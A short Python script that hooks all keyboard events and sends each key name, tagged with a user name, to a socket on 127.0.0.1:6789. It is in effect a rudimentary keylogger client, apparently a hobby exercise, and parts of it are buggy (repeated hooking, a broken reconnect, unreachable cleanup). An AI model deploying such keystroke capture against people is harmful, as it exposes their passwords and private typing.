import socket
from time import sleep
from keyboard import hook
from settings import TIMER


HOST, PORT = '127.0.0.1', 6789

SOCKET = None
DATA = None


class User:
    def __init__(self, name: str, surname: str = 'X') -> None:
        self.name, self.surname = name, surname


user = User('Vladik')
klavisha = None


def main() -> None:
    global SOCKET, DATA, klavisha

    print('подключение..')
    SOCKET = socket.socket()
    SOCKET.connect((HOST, PORT))
    print('подключен')

    while True:
        try:
            hook(get_key)
            SOCKET.send(user.name.encode() + f' нажал клавишу << {klavisha} >>'.encode())
        except KeyboardInterrupt:
            print('подключение разорвано')
        except ConnectionResetError:
            try:
                print(127)
                SOCKET.connect((HOST, PORT))
                print('переподключение')
            except OSError:
                print(126)
        sleep(TIMER)
    SOCKET.close()


def get_key(event) -> None:
    global klavisha
    print(event, event.event_type, event.name)
    if event.event_type == 'up': klavisha = 'None'
    else: klavisha = event.name


def save(data) -> None:
    with open('a.txt', 'w') as file:
        file.write(data.decode())
        file.close()


if __name__ == '__main__':
    main()
